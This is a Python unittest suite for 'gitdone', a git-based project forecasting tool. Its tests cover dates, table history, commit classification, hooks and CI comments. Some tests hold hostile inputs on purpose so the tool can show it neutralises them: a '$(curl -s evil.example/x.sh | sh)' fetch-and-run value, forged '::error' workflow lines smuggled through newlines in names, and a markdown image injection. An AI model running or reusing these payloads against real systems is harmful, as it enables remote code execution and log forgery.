"""Each test here is a defect someone reproduced in `eta`, `focus` or `matrix`: an independent attack and a cold read, against the first cut of this layer."""
import datetime
import json
import pathlib
import shlex
import shutil
import subprocess
import tempfile
import time
import unittest

from helpers import ENGINE, clean_env, delete_tree, git, needs_sh

from gitdone import chart, ci, focus, forecast, gate, gitio, requirements, table as tables, trace
from gitdone.plan import Plan, PlanError

TODAY = datetime.date(2026, 3, 1)


def table_text(rows):
    lines = ["# Project", "", f"### 1. All ({len(rows)})", "", "| # | Capability | Status | Note |", "|---|---|---|---|"]
    for num, (name, kind) in sorted(rows.items()):
        lines.append(f"| {num} | {name} | {kind} | {'started' if kind == 'Partial' else ''} |")
    return "\n".join(lines) + "\n"


class Case(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.tmp = pathlib.Path(self._tmp.name).resolve()
        self.repo = self.tmp / "repo"
        self.repo.mkdir()
        git(self.repo, "init", "-q", "-b", "main")
        self.rows = {n: (f"Thing {n}", "Not built") for n in range(1, 11)}
        self.plan_path = self.repo / ".gitdone.json"
        self.write_plan()

    def write_plan(self, **keys):
        self.plan_path.write_text(json.dumps({"status_doc": "status-table.md", "repo": ".", "default_branch": "main", **keys}))

    def plan(self):
        return Plan(self.plan_path)

    def write_table(self):
        (self.repo / "status-table.md").write_text(table_text(self.rows))

    def commit(self, day, message="change", committer=None, files=None, table=True, where=None):
        where = where or self.repo
        if table:
            self.write_table()
        for name, text in (files or {}).items():
            path = where / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(text)
        git(where, "add", "-A")
        git(where, "commit", "-q", "--allow-empty", "-m", message,
            env={"GIT_AUTHOR_DATE": f"{day}T12:00:00", "GIT_COMMITTER_DATE": f"{committer or day}T12:00:00"})
        return git(where, "rev-parse", "HEAD")

    def move(self, num, kind, day, **keys):
        self.rows[num] = (self.rows[num][0], kind)
        return self.commit(day, **keys)

    def steady(self):
        self.commit("2026-01-01", "first")
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15", "2026-02-20"), start=1):
            self.move(i, "Partial", day)

    def data(self, **kwargs):
        return forecast.data(self.plan(), today=TODAY, **kwargs)

    def engine(self, *args, cwd=None, env=None):
        return subprocess.run(["python3", str(ENGINE), *args], cwd=str(cwd or self.repo), env={**clean_env(), **(env or {})}, capture_output=True, text=True, stdin=subprocess.DEVNULL)


class TheDatesInTheHistory(Case):
    def test_t3_an_old_committer_date_near_the_tip_hides_nothing(self):
        self.steady()
        before = self.data()
        (self.repo / "y.txt").write_text("x\n")
        self.commit("2026-02-25", "landed from an old branch", committer="2015-01-01")
        after = self.data()
        self.assertEqual(after["moving_days"], before["moving_days"])
        self.assertEqual(after["state"], "dated")

    def test_t3_focus_is_not_hidden_by_one_either(self):
        self.steady()
        for i in range(3):
            self.commit(f"2026-02-2{i + 1}", f"row 1: work {i}", files={f"w{i}.py": "1\n"}, table=False)
        self.commit("2026-02-25", "row 1: an old committer", committer="2015-01-01", files={"z.py": "1\n"}, table=False)
        self.assertEqual(focus.data(self.plan(), today=TODAY)["on_plan"], 4)

    def test_t4_a_rebase_of_old_work_moves_nothing(self):
        self.commit("2025-12-01", "first")
        for i, day in enumerate(("2025-12-10", "2025-12-20", "2026-01-05", "2026-01-15", "2026-01-25", "2026-02-05", "2026-02-10", "2026-02-20"), start=1):
            self.move(i, "Partial", day)
        before = self.data()
        git(self.repo, "rebase", "-q", "--root", "--force-rebase", env={"GIT_COMMITTER_DATE": "2026-02-28T12:00:00"})
        after = self.data()
        self.assertEqual((after["likely"], after["moving_days"]), (before["likely"], before["moving_days"]))

    def test_t14_one_future_author_date_is_not_carried_forward(self):
        self.commit("2026-01-01", "first")
        self.rows[1] = ("Thing 1", "Partial")
        self.commit("2031-01-01", "m1", committer="2026-02-03")
        for i, day in zip((2, 3, 4), ("2026-02-08", "2026-02-15", "2026-02-22")):
            self.move(i, "Partial", day)
        self.assertEqual(self.data()["moving_days"], 4)

    def test_t14_a_chart_stays_on_its_canvas(self):
        self.commit("2026-01-01", "first")
        self.rows[1] = ("Thing 1", "Partial")
        self.commit("2031-01-01", "m1", committer="2031-01-01")
        items = chart.points(self.plan(), today=TODAY.isoformat())
        self.assertLessEqual(items[-1]["date"], TODAY.isoformat())

    def test_t40_a_huge_window_is_the_tables_life(self):
        self.steady()
        found = self.data(days=30000)
        self.assertEqual(found["window_days"], (TODAY - datetime.date(2026, 1, 1)).days + 1)

    def test_t33_the_words_say_within_what(self):
        self.commit("2025-01-01", "first")
        for i, day in enumerate(("2025-02-01", "2025-02-02", "2025-02-03", "2025-02-04"), start=1):
            self.move(i, "Partial", day)
        self.move(5, "Partial", "2026-02-20")
        self.assertIn("rows moved on 1 of the last 28 days", forecast.headline(self.data()))


class TheTablesHistory(Case):
    def test_t13_a_rename_does_not_look_like_a_birth(self):
        self.commit("2025-01-01", "first")
        for i, day in enumerate(("2025-02-01", "2025-03-01"), start=1):
            self.move(i, "Partial", day)
        (self.repo / "docs").mkdir()
        git(self.repo, "mv", "status-table.md", "docs/status-table.md")
        self.write_plan(status_doc="docs/status-table.md")
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "move the table", env={"GIT_AUTHOR_DATE": "2026-02-18T12:00:00", "GIT_COMMITTER_DATE": "2026-02-18T12:00:00"})
        self.assertEqual(self.data()["window_days"], 28)

    def test_t11_a_tracker_beside_another_does_not_inherit_its_life(self):
        one, two = self.repo / "a", self.repo / "b"
        one.mkdir()
        two.mkdir()
        self.plan_path.unlink()
        text = json.dumps({"status_doc": "status-table.md", "repo": ".", "default_branch": "main"})
        (one / ".gitdone.json").write_text(text)
        (one / "status-table.md").write_text(table_text(self.rows))
        self.commit("2026-01-01", "a begins", table=False)
        for i, day in enumerate(("2026-02-05", "2026-02-10"), start=1):
            self.rows[i] = (f"Thing {i}", "Partial")
            (one / "status-table.md").write_text(table_text(self.rows))
            self.commit(day, f"a moves {i}", table=False)
        shutil.copy(one / "status-table.md", two / "status-table.md")
        (two / ".gitdone.json").write_text(text)
        self.commit("2026-02-28", "b begins, from a's table", table=False)
        found = forecast.data(Plan(two / ".gitdone.json"), today=TODAY)
        self.assertEqual(found["window_days"], 2)
        self.assertEqual(found["scope"]["added"], 0)
        self.assertEqual(chart.points(Plan(two / ".gitdone.json"), today=TODAY.isoformat())[0]["date"], "2026-02-28")

    def test_t15_a_table_that_did_not_parse_says_nothing_about_any_row(self):
        self.commit("2026-01-01", "first")
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15"), start=1):
            self.move(i, "Partial", day)
        (self.repo / "status-table.md").write_text(table_text(self.rows).replace("### 1. All (10)", "### Core"))
        self.commit("2026-02-20", "oops", table=False)
        self.move(4, "Partial", "2026-02-21")
        found = self.data()
        self.assertEqual((found["scope"]["added"], found["scope"]["removed"]), (0, 0))
        self.assertEqual(found["moving_days"], 4)

    def test_t21_a_table_with_windows_line_ends_keeps_its_rows(self):
        def write():
            text = "```\nexample\n```\n\n" + table_text(self.rows)
            (self.repo / "status-table.md").write_bytes(text.replace("\n", "\r\n").encode())
        write()
        self.commit("2026-01-01", "first", table=False)
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15"), start=1):
            self.rows[i] = (f"Thing {i}", "Partial")
            write()
            self.commit(day, f"m{i}", table=False)
        self.assertEqual(self.data()["moving_days"], 3)
        self.assertEqual(chart.points(self.plan(), today=TODAY.isoformat())[-1]["scope"], 10)

    def test_t42_a_quote_in_the_tables_name(self):
        name = 'my "table".md'
        self.write_plan(status_doc=name)
        (self.repo / name).write_text(table_text(self.rows))
        self.commit("2026-01-01", "first", table=False)
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15"), start=1):
            self.rows[i] = (f"Thing {i}", "Partial")
            (self.repo / name).write_text(table_text(self.rows))
            self.commit(day, f"m{i}", table=False)
        self.assertEqual(self.data()["moving_days"], 3)

    def test_t17_a_shallow_clone_says_so_rather_than_a_date(self):
        self.steady()
        clone = self.tmp / "clone"
        git(self.tmp, "clone", "-q", "--depth", "2", f"file://{self.repo}", str(clone))
        found = forecast.data(Plan(clone / ".gitdone.json"), today=TODAY)
        self.assertEqual(found["state"], "shallow")
        self.assertIsNone(found["likely"])
        self.assertIn("shallow", forecast.headline(found))

    def test_t20_a_history_git_cannot_read_is_an_error_and_not_a_shorter_history(self):
        self.steady()
        tree = git(self.repo, "rev-parse", "HEAD~2^{tree}")
        (self.repo / ".git" / "objects" / tree[:2] / tree[2:]).chmod(0o644)
        (self.repo / ".git" / "objects" / tree[:2] / tree[2:]).unlink()
        with self.assertRaises(PlanError):
            self.data()

    def test_a_repository_with_no_commit_is_no_error(self):
        self.write_table()
        self.assertEqual(self.data()["state"], "too_little")


class TheWords(Case):
    def test_t16_rows_that_moved_and_went_back_are_not_nothing_moving(self):
        self.commit("2026-01-01", "first")
        for day, kind in (("2026-02-05", "Partial"), ("2026-02-10", "Not built"), ("2026-02-15", "Partial"), ("2026-02-20", "Not built")):
            self.move(1, kind, day)
        words = forecast.headline(self.data())
        self.assertIn("went back as far as they came", words)
        self.assertNotIn("nothing moved", words)

    def test_t26_an_85_percent_date_past_ten_years_is_not_given_as_ten_years(self):
        dates = forecast._dates(39.6, [0.0] * 8 + [3.0] + [0.0] * 4 + [-3.0] + [0.0] * 9 + [0.4] + [0.0] * 4, TODAY)
        self.assertIsNotNone(dates["likely"])
        self.assertIsNone(dates["sure"])

    def test_t26_the_headline_says_so(self):
        self.steady()
        found = {**self.data(), "sure": None}
        self.assertIn("the 85% date is more than ten years away", forecast.headline(found))

    def test_t34_a_small_need_is_not_zero(self):
        self.assertEqual(forecast._pace_words(0.002), "under 0.01")

    def test_t35_nothing_left_by_the_weights_is_not_every_row_done(self):
        self.rows = {1: ("A", "Merged"), 2: ("B", "Merged")}
        self.write_plan(kinds=[{"name": "Live", "weight": 1.0, "evidence": "release"}, {"name": "Merged", "weight": 1.0}, {"name": "Todo", "weight": 0.0}])
        self.commit("2026-01-01", "first")
        words = forecast.headline(self.data())
        self.assertIn("by the plan's weights", words)
        self.assertNotIn("every row is done", words)

    def test_t37_a_start_after_the_deadline_is_refused(self):
        self.write_plan(deadline="2026-03-05", start="2026-04-01")
        with self.assertRaisesRegex(PlanError, "after the deadline"):
            self.plan()

    def test_the_date_says_what_it_rests_on_when_scope_keeps_growing(self):
        self.steady()
        for n, day in zip((11, 12), ("2026-02-16", "2026-02-21")):
            self.rows[n] = (f"Thing {n}", "Not built")
            self.commit(day)
        found = self.data()
        self.assertIn("if the scope stops growing", forecast.headline(found))
        self.assertIn("rows a day against", forecast.text(found))
        self.assertNotIn("sure", found["scope"]["if_it_goes_on"] or {})

    def test_a_group_can_be_asked_for_as_the_opener_calls_it(self):
        self.steady()
        done = self.engine("eta", "--group", "All", "--json")
        self.assertEqual(done.returncode, 0, done.stderr)

    def test_the_burndown_as_csv_is_csv(self):
        self.steady()
        done = self.engine("chart", "--burndown", "--csv")
        self.assertTrue(done.stdout.startswith("date,scope,strict,weighted"), done.stdout[:80])


class TheLiveLine(Case):
    def test_a_burst_of_partial_rows_cannot_pass_for_progress(self):
        """One commit marks seven rows Partial with a word each. The weighted date jumps, and the line through Live rows does not move."""
        self.commit("2026-01-01", "first")
        for i, day in zip(range(1, 4), ("2026-02-05", "2026-02-10", "2026-02-15")):
            self.rows[i] = (f"Thing {i}", "Partial")
            self.commit(day)
        found = self.data()
        self.assertEqual(found["live"]["left"], 10)
        self.assertEqual(found["live"]["moving_days"], 0)
        self.assertIsNone(found["live"]["likely"])
        self.assertGreater(found["short_of_live_share"], 0.99)
        words = forecast.text(found)
        self.assertIn("Counting only Live rows: no date", words)
        self.assertIn("stopped short of Live", words)

    def test_rows_reaching_live_get_their_own_date(self):
        repo_commit = self.commit("2026-01-01", "first")
        for i, day in zip(range(1, 5), ("2026-02-05", "2026-02-10", "2026-02-15", "2026-02-20")):
            self.rows[i] = (f"Thing {i}", "Live")
            self.commit(day)
        self.assertTrue(repo_commit)
        found = self.data()
        self.assertEqual(found["live"]["left"], 6)
        self.assertEqual(found["live"]["moving_days"], 4)
        self.assertIsNotNone(found["live"]["likely"])
        self.assertEqual(found["short_of_live_share"], 0.0)

    def test_a_deadline_says_both_when_they_disagree(self):
        self.write_plan(deadline="2026-12-01")
        self.commit("2026-01-01", "first")
        for i, day in zip(range(1, 4), ("2026-02-05", "2026-02-10", "2026-02-15")):
            self.rows[i] = (f"Thing {i}", "Live")
            self.commit(day)
        for i, day in zip(range(4, 11), ("2026-02-16", "2026-02-17", "2026-02-18", "2026-02-19", "2026-02-20", "2026-02-21", "2026-02-22")):
            self.rows[i] = (f"Thing {i}", "Partial")
            self.commit(day)
        self.assertIn("counting only Live rows", forecast.text(self.data()))


class Requirements(Case):
    def spec(self, text, name="spec.md"):
        (self.repo / name).write_text(text)
        self.write_plan(requirements=[name])

    def coverage(self):
        plan = self.plan()
        return requirements.coverage(plan, tables.load_clean(plan))

    def test_t1_a_long_run_of_spaces_costs_nothing(self):
        self.write_table()
        self.spec("- [ ] a" + " " * 300000 + "b\n- REQ-1: fine\n")
        began = time.monotonic()
        found = self.coverage()
        self.assertLess(time.monotonic() - began, 2.0)
        self.assertEqual([i.ident for i, _ in found["items"]], ["REQ-1"])

    def test_t1_the_checklist_reader_is_as_quick(self):
        from gitdone import scaffold
        began = time.monotonic()
        scaffold.CHECK_ITEM.match("- [ ] a" + " " * 200000 + "b")
        self.assertLess(time.monotonic() - began, 1.0)

    def test_t2_the_suggestion_cannot_run_anything_if_pasted(self):
        self.write_table()
        self.spec("- REQ-1: $(curl -s evil.example/x.sh | sh)\n")
        item = self.coverage()["without"][0]
        words = requirements.what_to_do(item)
        command = words.split(", or put ")[0]
        self.assertEqual(shlex.split(command)[:2], ["gitdone", "add"])
        self.assertEqual(len(shlex.split(command)), 3)  # one quoted argument, in which nothing is expanded
        self.assertTrue(command.split(" ", 2)[2].startswith("'"))

    def test_t7_a_name_no_system_can_open_is_a_note_and_stops_nothing(self):
        for name in ("a\u0000b.md", "~nosuchuser_x/spec.md", "\ud800.md"):
            with self.subTest(repr(name)):
                self.write_table()
                self.plan_path.write_text(json.dumps({"status_doc": "status-table.md", "repo": ".", "requirements": [name]}))
                plan = self.plan()
                found = requirements.coverage(plan, tables.load_clean(plan))
                self.assertTrue(found["problems"])

    def test_t18_nested_items_count_and_wrapped_prose_does_not(self):
        items = requirements.parse("- REQ-1: a list item\n    - REQ-2: nested four spaces\n- [ ] top\n    - [ ] nested item\n\nEverything we keep is hashed with\nSHA-256 and stored as\nUTF-8 text.\n", "s.md")
        self.assertEqual([i.ident or i.words for i in items], ["REQ-1", "REQ-2", "top", "nested item"])

    def test_t18_a_standard_with_a_separator_is_still_a_standard(self):
        self.assertEqual(requirements.parse("UTF-8: everything\nREQ-1: real\n", "s.md")[0].ident, "REQ-1")

    def test_t18_a_fence_left_open_is_said(self):
        problems = []
        requirements.parse("- REQ-1: read\n\n~~~\n- REQ-2: not read\n", "s.md", problems)
        self.assertIn("never closes", problems[0])

    def test_t41_a_long_spec_against_a_long_table_is_quick(self):
        self.rows = {n: (f"Thing {n} of many", "Not built") for n in range(1, 5001)}
        self.write_table()
        self.spec("".join(f"REQ-{i}: thing {i}\n" for i in range(1, 5001)))
        began = time.monotonic()
        self.coverage()
        self.assertLess(time.monotonic() - began, 3.0)

    def test_an_id_with_the_same_words_as_a_row_finds_it(self):
        """The cold reader's first hour: a spec and a table with the same words read 0 of 9, and the advice was to add every row again."""
        self.rows = {1: ("Create an invoice from the command line", "Not built")}
        self.write_table()
        self.spec("- REQ-1: Create an invoice from the command line\n")
        self.assertEqual(self.coverage()["without"], [])

    def test_an_id_in_a_row_still_wins_over_words(self):
        self.rows = {1: ("Create an invoice from the command line", "Not built"), 2: ("Something else", "Not built")}
        (self.repo / "status-table.md").write_text(table_text(self.rows).replace("| 2 | Something else | Not built |  |", "| 2 | Something else | Not built | REQ-1 |"))
        self.spec("- REQ-1: Create an invoice from the command line\n")
        self.assertEqual([r.num for r in self.coverage()["items"][0][1]], [2])

    def test_export_to_pdf_is_not_export_to_csv(self):
        self.rows = {1: ("Export invoice to PDF", "Not built")}
        self.write_table()
        self.spec("- [ ] Export invoice to CSV\n")
        self.assertEqual(len(self.coverage()["without"]), 1)

    def test_init_from_a_spec_keeps_the_spec_as_what_the_rows_answer_to(self):
        self.plan_path.unlink()
        (self.repo / "spec.md").write_text("# Spec\n\n- REQ-1: Sign in\n- REQ-2: Search\n")
        done = self.engine("init", "--from-checklist", "spec.md")
        self.assertEqual(done.returncode, 0, done.stderr)
        plan = self.plan()
        self.assertEqual(plan.requirements, ["spec.md"])
        table = tables.load_clean(plan)
        self.assertEqual(sorted(r.name for r in table.rows.values()), ["Search", "Sign in"])
        self.assertEqual(requirements.coverage(plan, table)["without"], [])

    def test_a_checklist_outside_the_project_is_not_named(self):
        self.plan_path.unlink()
        outside = self.tmp / "todo.md"
        outside.write_text("- [ ] One\n")
        done = self.engine("init", "--from-checklist", str(outside))
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertEqual(self.plan().requirements, [])


class Newlines(Case):
    def test_t5_a_requirement_file_name_cannot_start_a_line(self):
        self.write_table()
        (self.repo / "spec.md").write_text("- REQ-1: words\n")
        self.write_plan(requirements=["x\n::error title=gitdone::the gate failed\n/../spec.md"])
        lines = gate.report(self.plan(), offline=True).lines()
        for line in lines:
            self.assertFalse(line.startswith("::"), line)

    def test_t5_a_folder_with_a_newline_cannot_start_a_line(self):
        needs_sh(self)
        self.commit("2026-01-01", "first")
        name = "a\nresult: PASS\n::error::from a file name/x.py"
        self.commit("2026-02-25", "Odd work", files={name: "1\n"}, table=False)
        words = focus.text(focus.data(self.plan(), today=TODAY))
        for line in words.split("\n"):
            self.assertFalse(line.startswith(("::", "result:")), line)

    def test_t5_a_workstream_name_cannot_start_a_line(self):
        self.write_plan(workstreams=[{"id": "P1", "name": "x\n::error::forged", "rows": "1-2"}], order=["P1"])
        self.steady()
        for words in (forecast.text(self.data()), focus.next_text(focus.next_data(self.plan())), focus.text(focus.data(self.plan(), today=TODAY))):
            for line in words.split("\n"):
                self.assertFalse(line.startswith("::"), line)


class TheFocusCommits(Case):
    def judged(self, message, files, day="2026-02-25"):
        sha = self.commit(day, message, files=files, table=False)
        return {c["commit"]: c for c in focus.data(self.plan(), today=TODAY)["list"]}[sha[:7]]

    def setUp(self):
        super().setUp()
        self.commit("2026-01-01", "first")

    def test_t6_a_pattern_a_python_cannot_read_matches_nothing(self):
        self.write_plan(focus={"upkeep": ["[z-a]"]})
        self.assertEqual(self.judged("Work", {"x.py": "1\n"})["class"], focus.OFF)

    def test_t19_a_few_bytes_cannot_ask_for_much(self):
        self.write_plan(focus={"paths": {f"{i}-{i + 99999}": ["x/"] for i in range(1, 121)}})
        with self.assertRaisesRegex(PlanError, "names more than"):
            self.plan()

    def test_t25_a_message_with_the_old_separators_is_read_whole(self):
        path = self.repo / "a.py"
        path.write_text("1\n")
        git(self.repo, "add", "-A")
        stamp = "2026-02-25T12:00:00"
        subprocess.run(["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-C", str(self.repo), "commit", "-q", "-F", "-"],
                       input=b"ship something big\x01\x02\n", env={**clean_env(), "GIT_AUTHOR_DATE": stamp, "GIT_COMMITTER_DATE": stamp}, check=True)
        found = focus.data(self.plan(), today=TODAY)
        self.assertEqual(found["off_plan"], 1)
        self.assertEqual(found["list"][0]["class"], focus.OFF)

    def test_t29_a_range_reads_the_whole_of_the_tables_history(self):
        base = git(self.repo, "rev-parse", "HEAD")
        self.rows[1] = ("Thing 1", "Partial")
        self.commit("2025-06-01", "Wire it up", files={"zz.py": "1\n"})
        found = focus.data(self.plan(), today=TODAY, revisions=f"{base}..HEAD")
        self.assertEqual(found["on_plan"], 1)

    def test_t31_a_branch_row_3_2fa_login_names_row_3(self):
        self.assertEqual(focus.named_rows("Merge branch 'row-3-2fa-login'", {1, 2, 3}), {3})

    def test_t31_a_range_needs_the_plural(self):
        self.assertEqual(focus.named_rows("rows 1-3", {1, 2, 3, 4}), {1, 2, 3})
        self.assertEqual(focus.named_rows("row 3-1", {1, 2, 3}), {3})
        self.assertEqual(focus.named_rows("rows 3-1", {1, 2, 3}), {1, 2, 3})

    def test_t32_the_plans_paths_for_a_row_finished_long_ago_are_polish(self):
        self.rows[1] = ("Thing 1", "Live")
        (self.repo / "status-table.md").write_text(table_text(self.rows))
        self.commit("2026-01-02", "row 1 went live", table=False)
        self.write_plan(focus={"paths": {"1": ["src/"]}})
        self.assertEqual(self.judged("Polish the driver", {"src/d.py": "1\n"})["class"], focus.OFF)

    def test_a_revert_advances_nothing_even_with_a_rows_words(self):
        self.rows[1] = ("Export invoice", "Not built")
        self.write_table()
        self.commit("2026-02-20", "scope", table=False)
        self.assertEqual(self.judged('Revert "Export invoice to PDF"', {"src/e.py": "1\n"})["class"], focus.UPKEEP)

    def test_a_revert_of_a_commit_that_named_a_row_is_not_on_plan(self):
        self.assertEqual(self.judged('Revert "row 1: the thing"', {"src/e.py": "1\n"})["class"], focus.UPKEEP)

    def test_a_large_change_is_not_upkeep_for_saying_so(self):
        big = "".join(f"line {i}\n" for i in range(focus.UPKEEP_SUBJECT_LINES + 1))
        judged = self.judged("chore: rewrite the whole plugin system", {"src/plugins.py": big})
        self.assertEqual(judged["class"], focus.OFF)
        self.assertIn("says upkeep", judged["because"])

    def test_a_small_chore_still_is(self):
        self.assertEqual(self.judged("chore: tidy", {"src/plugins.py": "1\n"})["class"], focus.UPKEEP)

    def test_a_row_the_table_does_not_have_is_said(self):
        self.assertIn("row 99, which the table does not have", self.judged("Polish, row 99", {"a.py": "1\n"})["because"])

    def test_a_workstream_named_in_the_message_ties_it(self):
        self.write_plan(workstreams=[{"id": "P2", "name": "Launch", "rows": "3-4"}], order=["P2"])
        judged = self.judged("P2: reminder sender", {"a.py": "1\n"})
        self.assertEqual(judged["rows"], [3, 4])
        self.assertIn("workstream", judged["because"])

    def test_commits_older_than_the_table_are_not_judged(self):
        fresh = self.tmp / "fresh"
        fresh.mkdir()
        git(fresh, "init", "-q", "-b", "main")
        self.commit("2026-02-20", "Add a login form", files={"login.py": "1\n"}, table=False, where=fresh)
        self.commit("2026-02-21", "Add a parser", files={"parser.py": "1\n"}, table=False, where=fresh)
        (fresh / ".gitdone.json").write_text(self.plan_path.read_text())
        (fresh / "status-table.md").write_text(table_text(self.rows))
        self.commit("2026-02-22", "Start the tracker", table=False, where=fresh)
        self.assertEqual(focus.data(Plan(fresh / ".gitdone.json"), today=TODAY)["commits"], 0)
        self.commit("2026-02-23", "Work on something", files={"more.py": "1\n"}, table=False, where=fresh)
        self.assertEqual(focus.data(Plan(fresh / ".gitdone.json"), today=TODAY)["commits"], 1)

    def test_a_branch_named_for_a_row_ties_its_commits_before_any_merge(self):
        git(self.repo, "checkout", "-q", "-b", "row-5-payments")
        judged = self.judged("Add a charge", {"pay.py": "1\n"})
        self.assertEqual(judged["rows"], [5])
        self.assertIn("branch", judged["because"])

    def test_lines_and_words_are_in_the_numbers(self):
        self.rows[1] = ("Search across projects", "Not built")
        self.write_table()
        self.commit("2026-02-20", "scope", table=False)
        self.judged("Search results across all projects", {"s.py": "1\n2\n"})
        found = focus.data(self.plan(), today=TODAY)
        self.assertEqual(found["on_plan_by_words"], 1)
        self.assertIn("1 by words alone", focus.text(found))
        self.assertIn("lines", focus.text(found))


class TheHook(Case):
    def setUp(self):
        super().setUp()
        needs_sh(self)

    def real_commit(self, message, name, where=None):
        where = where or self.repo
        path = where / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(message + "\n")
        git(where, "add", "-A")
        return subprocess.run(["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-C", str(where), "commit", "-m", message],
                              env=clean_env(), capture_output=True, text=True)

    def installed(self, cwd=None):
        cwd = cwd or self.repo
        self.assertEqual(self.engine("render", "--write", cwd=cwd).returncode, 0)
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "the tracker")
        done = self.engine("install-hook", cwd=cwd)
        self.assertEqual(done.returncode, 0, done.stderr)

    def test_t8_with_the_code_elsewhere_a_commit_here_is_not_judged_against_it(self):
        code = self.tmp / "code"
        code.mkdir()
        git(code, "init", "-q", "-b", "main")
        self.commit("2026-02-20", "code: printer driver", files={"printer.py": "1\n"}, table=False, where=code)
        self.write_plan(repo=str(code))
        self.write_table()
        self.installed()
        done = self.real_commit("row 1: notes", "notes.txt")
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertNotIn("off plan", done.stdout + done.stderr)

    def test_t9_a_tracker_in_a_subfolder_is_heard(self):
        project = self.repo / "proj"
        project.mkdir()
        self.plan_path.unlink()
        self.plan_path = project / ".gitdone.json"
        self.write_plan()
        (project / "status-table.md").write_text(table_text(self.rows))
        self.installed(cwd=project)
        done = self.real_commit("Wire up the printer", "proj/f.py")
        self.assertIn("is off plan", done.stdout + done.stderr)

    def test_t27_no_focus_takes_out_the_hook_this_engine_wrote(self):
        self.write_table()
        self.installed()
        hook = self.repo / ".git" / "hooks" / "post-commit"
        self.assertTrue(hook.exists())
        self.assertEqual(self.engine("install-hook", "--no-focus").returncode, 0)
        self.assertFalse(hook.exists())

    def test_t28_a_rebase_does_not_repeat_what_was_said(self):
        self.write_table()
        self.installed()
        git(self.repo, "checkout", "-q", "-b", "f")
        for i in range(3):
            self.real_commit(f"Wire up {i}", f"f{i}.py")
        git(self.repo, "checkout", "-q", "main")
        self.real_commit("row 1: x", "m.py")
        git(self.repo, "checkout", "-q", "f")
        done = subprocess.run(["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-C", str(self.repo), "rebase", "main"],
                              env=clean_env(), capture_output=True, text=True)
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertNotIn("is off plan", done.stdout + done.stderr)


class Monorepo(Case):
    def setUp(self):
        super().setUp()
        self.plan_path.unlink()
        self.one, self.two = self.repo / "a", self.repo / "b"
        for project in (self.one, self.two):
            project.mkdir()
            (project / ".gitdone.json").write_text(json.dumps({"status_doc": "status-table.md", "repo": ".", "default_branch": "main"}))
            (project / "status-table.md").write_text(table_text(self.rows))
        self.commit("2026-01-01", "both begin", table=False)

    def test_t12_a_siblings_commits_are_not_off_this_plan(self):
        for i in range(3):
            self.commit(f"2026-02-2{i}", f"a: work {i}", files={f"a/src/w{i}.py": "1\n"}, table=False)
        self.assertEqual(focus.data(Plan(self.two / ".gitdone.json"), today=TODAY)["commits"], 0)
        self.assertEqual(focus.data(Plan(self.one / ".gitdone.json"), today=TODAY)["commits"], 3)

    def test_t10_a_tracker_in_a_subfolder_finds_its_tests(self):
        self.commit("2026-02-20", "row 1: export", files={"a/tests/test_export.py": "1\n"}, table=False)
        rows = {r["row"]: r for r in trace.rows_data(Plan(self.one / ".gitdone.json"), offline=True)}
        self.assertEqual(rows[1]["tests"], ["tests/test_export.py"])

    def test_t30_a_plans_paths_are_from_the_plans_folder(self):
        data = json.loads((self.one / ".gitdone.json").read_text())
        data["focus"] = {"paths": {"1": ["src/"]}}
        (self.one / ".gitdone.json").write_text(json.dumps(data))
        self.commit("2026-02-20", "Wire up the printer", files={"a/src/d.py": "1\n"}, table=False)
        found = focus.data(Plan(self.one / ".gitdone.json"), today=TODAY)
        self.assertEqual(found["on_plan"], 1)


class Next(Case):
    def test_t22_an_empty_workstream_is_passed_over(self):
        self.write_plan(workstreams=[{"id": "P1", "name": "Empty", "rows": []}, {"id": "P2", "name": "Real", "rows": [1, 2]}], order=["P1", "P2"])
        self.write_table()
        found = focus.next_data(self.plan())
        self.assertEqual(found["workstream"]["id"], "P2")
        self.assertEqual([r["row"] for r in found["rows"]], [1, 2])

    def test_t22_eta_calls_it_no_rows(self):
        self.write_plan(workstreams=[{"id": "P1", "name": "Empty", "rows": []}, {"id": "P2", "name": "Real", "rows": [1, 2]}], order=["P1", "P2"])
        self.write_table()
        self.commit("2026-01-01", "first")
        self.assertRegex(forecast.text(self.data()), r"P1 Empty\s+no rows")

    def test_it_does_not_call_a_later_row_a_change_of_scope(self):
        self.write_table()
        self.assertIn("Work on no row is a change of scope", focus.next_text(focus.next_data(self.plan())))


class TheActionsComment(Case):
    def base(self):
        self.write_table()
        self.assertEqual(self.engine("render", "--write").returncode, 0)
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "base")
        return git(self.repo, "rev-parse", "HEAD")

    def test_t23_a_file_name_cannot_write_markdown_into_the_comment(self):
        (self.repo / "spec.md").write_text("- REQ-1: words\n")
        self.write_plan(requirements=["x`\n\n![p](https://evil.example/p.png) @someone\n\n`/../spec.md"])
        base = self.base()
        lines = "\n".join(ci._when_and_scope(self.plan(), base))
        for line in lines.split("\n"):
            self.assertFalse(line.startswith("!["), line)
        self.assertNotIn("`\n", lines.split("**Requirements with no row:**")[-1].split(".")[0])

    def test_t24_a_change_to_what_was_asked_for_is_judged(self):
        (self.repo / "spec.md").write_text("- REQ-1: one\n")
        self.write_plan(requirements=["spec.md"])
        base = self.base()
        (self.repo / "spec.md").write_text("- REQ-1: one\n- REQ-2: two\n")
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "spec: ask for more")
        self.assertTrue(ci.touched(self.plan(), base))

    def test_t36_a_moved_deadline_is_not_a_change_to_the_gates_rules(self):
        base = self.base()
        self.write_plan(deadline="2027-01-15")
        self.assertEqual(ci.rule_changes(self.plan(), base), [])
        self.assertIn("**Deadline:**", "\n".join(ci._when_and_scope(self.plan(), base)))

